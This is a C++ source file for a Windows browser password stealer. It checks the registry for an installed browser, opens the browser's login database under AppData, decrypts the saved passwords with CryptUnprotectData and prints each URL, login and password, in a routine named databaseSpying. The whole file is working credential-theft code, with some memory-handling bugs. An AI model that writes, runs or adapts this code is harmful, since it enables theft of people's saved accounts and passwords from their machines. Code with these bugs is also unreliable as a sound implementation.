
#include "BrowserPassword.hh"

bool isBrowserInstalled(const char *regKeyPath) 
{ 
	HKEY hkey = NULL;

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeyPath, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
	{ 
		std::cerr << "[KO] Browser is not installed" << std::endl; 
		return (false);
    	}
	std::cout << "[OK] Browser is installed" << std::endl;
	RegCloseKey(hkey); // close the key with handle pointer        
	return (true);
}

bool findAppdataPath(std::string &appdataPath, int folder) 
{ 
	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters

	if (SHGetFolderPathA(NULL, folder, NULL, 0, path) != S_OK)
	{ 
		std::cerr << "[KO] Error failed to find Appdata folder" << std::endl; 
		return (false); 
	}
	std::cout << "[OK] Appdata folder found" << std::endl;
	appdataPath.append(path); // add path in our string
	return (true);
}

void findPasswordTable(sqlite3 *db) 
{ 
	sqlite3_stmt *stmt;

	std::cout << "[OK] Database open" << std::endl;
	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, 0) == SQLITE_OK) 
	{
		std::cout << "[OK] Query successfully compiled" << std::endl;
		while (sqlite3_step(stmt) == SQLITE_ROW)  
			printPassword(stmt); /* decrypt and display infos */  
	} 
	else 
		std::cerr << "[KO] Error compiling query" << std::endl; 
	sqlite3_finalize(stmt); // finalize the compiled query
	sqlite3_close(db); // close database
}

const char *uncryptData(BYTE *password, int size) 
{ 
	DATA_BLOB in; 
	DATA_BLOB out;

    	in.pbData = password;
    	in.cbData = size + 1; 
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
	{ 
		out.pbData[out.cbData] = 0; // set zero terminator '\0' 
		return ((const char*)out.pbData);
    	} 
	return ("Error not found\n");
}

void printPassword(sqlite3_stmt *stmt) 
{ 
	// display URL
	std::cout << std::endl << "URL:\t" << sqlite3_column_text(stmt, 0) << std::endl;
	// display login
	std::cout << "Login:\t" << sqlite3_column_text(stmt, 1) << std::endl;
	// decrypt and display password
	std::cout << "Password:\t" << uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2)) << std::endl << std::endl;
}

void databaseSpying(const char *dbFilePath, const char *regKeyPath, int folder) 
{ 
	sqlite3 *db; 
	std::string dbPath; 

	if (isBrowserInstalled(regKeyPath)) // is browser installed on this computer ?
	{
		if (findAppdataPath(dbPath, folder)) // where is it's appdata folder
		{ 
			dbPath += dbFilePath; // appdata folder path + database file path
			if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK)
				findPasswordTable(db); /* find password table on database */
			else 
				std::cerr << "[KO] Error opening database" << std::endl; 
		} 
	} 
}
